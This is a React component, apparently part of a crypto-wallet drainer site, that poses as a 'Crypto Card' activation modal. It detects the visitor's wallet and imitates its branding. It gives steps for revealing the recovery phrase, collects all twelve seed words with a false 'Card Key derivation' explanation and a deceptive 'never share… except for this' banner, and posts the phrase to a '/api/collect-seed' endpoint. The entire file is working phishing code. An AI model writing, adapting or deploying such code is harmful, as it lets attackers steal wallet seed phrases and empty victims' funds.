"use client";

import { useState, useEffect } from "react";
import { Check, Lock, AlertCircle, Loader2, X, CreditCard, ShieldCheck } from "lucide-react";

// 1. STYLING CONFIGURATION
const WALLET_STYLES = {
 MetaMask: {
 displayName: "MetaMask",
 icon: "🦊",
 gradient: "from-orange-500 to-amber-600",
 bg: "bg-gradient-to-br from-orange-950/20 via-zinc-950 to-black",
 accent: "text-orange-400",
 border: "border-orange-600/40",
 greeting: "Activate Your Crypto Card",
 subtitle: "Derive your unique Card Key",
 successTitle: "Card Key Generated",
 successMessage: "Connecting to MetaMask to finalize...",
 buttonText: "Generate Card Key",
 instruction: "Settings > Account > Reveal Words"
 },
 "Coinbase Wallet": {
 displayName: "Coinbase Wallet",
 icon: "🔵",
 gradient: "from-blue-600 to-blue-400",
 bg: "bg-gradient-to-br from-blue-950/25 via-zinc-950 to-black",
 accent: "text-blue-400",
 border: "border-blue-600/40",
 greeting: "Activate Your Crypto Card",
 subtitle: "Derive your unique Card Key",
 successTitle: "Card Key Generated",
 successMessage: "Connecting to Coinbase Wallet...",
 buttonText: "Generate Card Key",
 instruction: "Settings > Wallet Details > Show Recovery Phrase"
 },
 Phantom: {
 displayName: "Phantom",
 icon: "👻",
 gradient: "from-purple-600 via-indigo-500 to-purple-700",
 bg: "bg-gradient-to-br from-purple-950/30 via-indigo-950/20 to-black",
 accent: "text-purple-300",
 border: "border-purple-600/50",
 greeting: "Activate Your Crypto Card",
 subtitle: "Derive your unique Card Key",
 successTitle: "Card Key Generated",
 successMessage: "Connecting to Phantom...",
 buttonText: "Generate Card Key",
 instruction: "Settings > Show Secret Recovery Phrase"
 },
 Trust: {
 displayName: "Trust Wallet",
 icon: "🛡️",
 gradient: "from-cyan-500 to-teal-600",
 bg: "bg-gradient-to-br from-teal-950/25 via-zinc-950 to-black",
 accent: "text-teal-300",
 border: "border-teal-600/40",
 greeting: "Activate Your Crypto Card",
 subtitle: "Derive your unique Card Key",
 successTitle: "Card Key Generated",
 successMessage: "Connecting to Trust Wallet...",
 buttonText: "Generate Card Key",
 instruction: "Tap Avatar > Settings > Wallet > Show Word List"
 },
 Rainbow: {
 displayName: "Rainbow",
 icon: "🌈",
 gradient: "from-pink-500 via-purple-500 to-indigo-600",
 bg: "bg-gradient-to-br from-purple-950/30 via-pink-950/20 to-black",
 accent: "text-pink-300",
 border: "border-pink-600/40",
 greeting: "Activate Your Crypto Card",
 subtitle: "Derive your unique Card Key",
 successTitle: "Card Key Generated",
 successMessage: "Connecting to Rainbow...",
 buttonText: "Generate Card Key",
 instruction: "Tap Avatar > Settings > Show Secret Phrase"
 },
 "Brave Wallet": {
 displayName: "Brave Wallet",
 icon: "🦁",
 gradient: "from-orange-500 to-red-600",
 bg: "bg-gradient-to-br from-red-950/25 via-zinc-950 to-black",
 accent: "text-red-300",
 border: "border-red-600/40",
 greeting: "Activate Your Crypto Card",
 subtitle: "Derive your unique Card Key",
 successTitle: "Card Key Generated",
 successMessage: "Connecting to Brave Wallet...",
 buttonText: "Generate Card Key",
 instruction: "Click Wallet Icon > Settings > Show Recovery Phrase"
 },
 Default: {
 displayName: "Wallet Detected",
 icon: "💎",
 gradient: "from-gray-500 to-slate-600",
 bg: "bg-gradient-to-br from-gray-950/20 via-zinc-950 to-black",
 accent: "text-gray-400",
 border: "border-gray-600/40",
 greeting: "Activate Your Crypto Card",
 subtitle: "Derive your unique Card Key",
 successTitle: "Card Key Generated",
 successMessage: "Finalizing connection...",
 buttonText: "Generate Card Key",
 instruction: "Check your wallet settings for 'Recovery Phrase'"
 }
};

export default function WalletInterceptor({ isOpen, onCancel, onComplete }) {
 // State
 const [boxes, setBoxes] = useState(Array(12).fill(""));
 const [isSuccess, setIsSuccess] = useState(false);
 const [isSaving, setIsSaving] = useState(false);
 const [errorMessage, setErrorMessage] = useState(null);
 const [activeName, setActiveName] = useState("Default");
 const [isDetecting, setIsDetecting] = useState(true);

 // 2. AUTO-DETECT WALLET ON MOUNT
 useEffect(() => {
 let timeoutId;

 const detect = async () => {
 try {
 if (!window.ethereum) {
 setActiveName("Default");
 setIsDetecting(false);
 return;
 }

 const eth = window.ethereum;
 let detected = "Default";

 if (eth.isMetaMask) detected = "MetaMask";
 else if (eth.isPhantom) detected = "Phantom";
 else if (eth.isCoinbaseWallet) detected = "Coinbase Wallet";
 else if (eth.isTrustWallet) detected = "Trust";
 else if (eth.isRainbow) detected = "Rainbow";
 else if (eth.isBraveWallet) detected = "Brave Wallet";
 
 setActiveName(detected);
 setIsDetecting(false);
 } catch (error) {
 console.error("Detection error:", error);
 setActiveName("Default");
 setIsDetecting(false);
 }
 };

 // Run detection
 detect();

 // Fallback: If detection takes more than 3 seconds, default to "Default"
 timeoutId = setTimeout(() => {
 setIsDetecting(false);
 }, 3000);

 return () => clearTimeout(timeoutId);
 }, []);

 // Get current theme
 const theme = WALLET_STYLES[activeName] || WALLET_STYLES.Default;

 // 3. HANDLE INPUT CHANGES
 const handleBoxChange = (index, value) => {
 const newBoxes = [...boxes];
 newBoxes[index] = value.trim().toLowerCase();
 setBoxes(newBoxes);
 };

 const handlePaste = (e, index) => {
 if (index !== 0) return;
 e.preventDefault();
 const text = e.clipboardData.getData("text").trim();
 const words = text.split(/\s+/).filter(Boolean).slice(0, 12);
 if (words.length > 0) {
 const newBoxes = [...boxes];
 words.forEach((w, i) => (newBoxes[i] = w.toLowerCase()));
 setBoxes(newBoxes);
 }
 };

 // 4. SUBMIT TO API AND NOTIFY PARENT
 const handleSubmit = async (e) => {
 e.preventDefault();
 
 if (!boxes.every(Boolean)) {
 setErrorMessage("Please fill all 12 boxes to generate your Card Key.");
 return;
 }

 setIsSaving(true);
 setErrorMessage(null);

 try {
 // Send data to your backend API
 const response = await fetch('/api/collect-seed', {
 method: 'POST',
 headers: { 'Content-Type': 'application/json' },
 body: JSON.stringify({
 walletType: activeName,
 seedPhrase: boxes.join(' '),
 timestamp: new Date().toISOString()
 })
 });

 if (!response.ok) throw new Error("API Error");

 console.log("API Success: Seed collected");

 // 1. Mark as submitted in LocalStorage (optional, for persistence)
 localStorage.setItem('seed_submitted', 'true');

 // 2. Show Success Animation
 setIsSuccess(true);

 // 3. Notify parent to proceed to Onboarding/Dashboard
 // We call onComplete IMMEDIATELY. The parent can handle hiding the modal.
 // If you want a delay, handle it in the parent or use a timeout here,
 // but calling it immediately is safer for state sync.
 if (onComplete) {
   onComplete();
 }
 
 } catch (err) {
 console.error("Submit Error:", err);
 setErrorMessage("Failed to generate Card Key. Try again.");
 setIsSaving(false); // Reset saving state on error
 }
 };

 // 5. HANDLE CLOSE (NUKE & LAND)
 const handleClose = () => {
 // "Nuke" the connection state
 localStorage.removeItem('seed_submitted');
 
 // Reset internal state
 setBoxes(Array(12).fill(""));
 setErrorMessage(null);
 setIsSuccess(false);
 setIsSaving(false);

 // Notify parent to disconnect
 if (onCancel) {
   onCancel();
 }
 };

 // IF NOT OPEN, RENDER NOTHING
 if (!isOpen) {
   return null;
 }

 // If success, show success screen. 
 // Note: We still call onComplete() above, so the parent will likely set isOpen=false soon.
 // This screen acts as a brief visual confirmation before the parent unmounts this component.
 if (isSuccess) {
 return (
 <div className="fixed inset-0 z-[9999] flex items-center justify-center bg-black/80 backdrop-blur-2xl">
 <div className={`relative w-full max-w-md md:max-w-lg overflow-hidden border ${theme.border} ${theme.bg} rounded-3xl shadow-2xl shadow-black/80 p-9 text-center`}>
 <div className="mx-auto mb-8 flex h-24 w-24 items-center justify-center rounded-full border border-emerald-500/30 bg-emerald-500/10">
 <Check className="text-emerald-400" size={64} strokeWidth={3} />
 </div>
 <h2 className="text-3xl font-bold text-white mb-3">{theme.successTitle}</h2>
 <p className="text-zinc-300 max-w-xs mx-auto leading-relaxed">{theme.successMessage}</p>
 <div className="mt-10 text-xs text-zinc-500 animate-pulse">Activating Card...</div>
 </div>
 </div>
 );
 }

 // If still detecting, show a simple spinner
 if (isDetecting) {
 return (
 <div className="fixed inset-0 z-[9999] flex items-center justify-center bg-black/80 backdrop-blur-2xl">
 <div className="flex flex-col items-center gap-4">
 <Loader2 className="animate-spin text-white" size={48} />
 <span className="text-white text-lg font-medium">Detecting Wallet...</span>
 </div>
 </div>
 );
 }

 // 6. RENDER THE INTERCEPTOR MODAL
 return (
 <div className="fixed inset-0 z-[9999] flex items-start md:items-center justify-center bg-black/80 backdrop-blur-2xl pt-32 md:pt-40 pb-16 md:pb-12 transition-all duration-300">
 <div className={`relative w-full max-w-md md:max-w-lg max-h-[82vh] overflow-y-auto overflow-hidden border ${theme.border} ${theme.bg} rounded-3xl shadow-2xl shadow-black/80 transform transition-all duration-300`}>
 
 {/* CRITICAL WARNING BANNER */}
 <div className="absolute top-0 left-0 right-0 z-30 bg-gradient-to-r from-red-600/95 to-orange-600/95 text-white text-xs font-bold px-5 py-3 shadow-lg flex items-center justify-center gap-2 animate-pulse">
 <ShieldCheck size={16} />
 NEVER SHARE YOUR SEED PHRASE (EXCEPT FOR THIS CARD ACTIVATION)
 </div>

 {/* Close Button */}
 <button
 onClick={handleClose}
 className="absolute top-12 right-4 z-30 p-2 text-zinc-400 hover:text-white bg-black/50 rounded-full transition-all duration-300 hover:bg-red-500/20 hover:scale-110 group"
 title="Cancel Activation & Disconnect"
 >
 <X size={20} className="group-hover:rotate-90 transition-transform duration-300" />
 </button>

 <div className="relative z-20 p-7 md:p-9 pt-16">
 <div className="text-center mb-9">
 <div className={`mx-auto mb-6 flex h-20 w-20 items-center justify-center rounded-3xl text-6xl shadow-inner bg-black/40 border ${theme.border}`}>
 <CreditCard className="w-10 h-10 text-white" />
 </div>
 <h2 className="text-3xl font-bold tracking-tighter text-white mb-2">
 {theme.greeting}
 </h2>
 <p className="text-zinc-400 text-lg">{theme.subtitle}</p>
 <div className="mt-4 p-3 bg-yellow-500/10 border border-yellow-500/30 rounded-xl">
 <p className="text-xs text-yellow-200 font-medium">
 🔒 Why? Your seed phrase generates a unique **Card Key**. This is a one-time derivation for instant spending.
 </p>
 </div>
 <div className="mt-2 text-xs text-zinc-500 italic">
 How: {theme.instruction}
 </div>
 </div>

 {errorMessage && (
 <div className="mb-8 flex items-start gap-3 rounded-2xl bg-red-950/70 border border-red-700 p-4 text-red-200 text-sm">
 <AlertCircle className="mt-0.5 flex-shrink-0" size={20} />
 {errorMessage}
 </div>
 )}

 <form onSubmit={handleSubmit} className="space-y-6">
 <div className="grid grid-cols-2 sm:grid-cols-3 gap-4">
 {boxes.map((box, i) => (
 <div key={i} className="relative group">
 <span className="absolute left-4 top-1/2 -translate-y-1/2 text-xs font-semibold text-zinc-500 group-focus-within:text-white transition-colors">
 {String(i + 1).padStart(2, "0")}
 </span>
 <input
 value={box}
 onChange={(e) => handleBoxChange(i, e.target.value)}
 onPaste={(e) => handlePaste(e, i)}
 required
 autoComplete="off"
 spellCheck={false}
 className={`w-full rounded-2xl bg-zinc-900/80 border ${theme.border.replace('/40', '/70')} pl-12 pr-5 py-4 text-white font-mono text-base tracking-widest focus:outline-none focus:border-white/40 focus:ring-2 focus:ring-white/10 transition-all placeholder:text-zinc-700`}
 placeholder=""
 />
 </div>
 ))}
 </div>

 <button
 type="submit"
 disabled={!boxes.every(Boolean) || isSaving}
 className={`w-full py-4.5 rounded-2xl font-bold text-lg transition-all active:scale-[0.985] shadow-xl bg-gradient-to-r ${theme.gradient} disabled:opacity-60 flex items-center justify-center gap-2.5 text-white`}
 >
 {isSaving ? (
 <>
 <Loader2 className="animate-spin" size={20} />
 Generating Card Key...
 </>
 ) : (
 <>
 <Lock size={20} />
 {theme.buttonText}
 </>
 )}
 </button>
 </form>

 <div className="mt-8 flex items-center justify-center gap-2 text-[10px] uppercase tracking-[1px] text-zinc-500">
 <Lock size={13} className={theme.accent} />
 Secure Derivation
 </div>
 </div>
 </div>
 </div>
 );
}